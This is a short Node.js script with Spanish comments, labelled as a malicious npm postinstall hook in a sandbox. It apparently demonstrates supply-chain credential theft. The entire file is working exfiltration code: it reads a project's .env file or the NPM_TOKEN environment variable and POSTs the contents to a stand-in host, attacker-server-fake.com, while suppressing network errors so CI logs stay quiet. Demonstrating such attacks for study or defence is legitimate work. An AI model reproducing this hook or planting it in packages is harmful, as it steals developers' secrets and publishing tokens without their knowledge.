const fs = require('fs');
const path = require('path');
const https = require('https');

console.log("[Sandbox] Hook malicioso postinstall disparado...");

const envPath = path.join(__dirname, '.env');
let stolenData = "";

// 1. Extracción (Sources)
if (fs.existsSync(envPath)) {
    console.log("[Sandbox] .env físico detectado. Extrayendo contenido.");
    stolenData = fs.readFileSync(envPath, 'utf8');
} else if (process.env.NPM_TOKEN) {
    console.log("[Sandbox] Leyendo token de NPM directo de memoria.");
    stolenData = process.env.NPM_TOKEN;
}

// 2. Exfiltración (Sink)
if (stolenData) {
    console.log("[Sandbox] Ejecutando payload de exfiltración...");

    const req = https.request({
        hostname: 'attacker-server-fake.com',
        port: 443,
        path: '/drop',
        method: 'POST'
    }, () => {});

    // Silenciamos error de DNS en los logs del CI
    req.on('error', () => {}); 
    
    // Inyección en el body
    req.write(JSON.stringify({ payload: stolenData }));
    req.end();
    
    console.log("[Sandbox] Payload enviado.");
}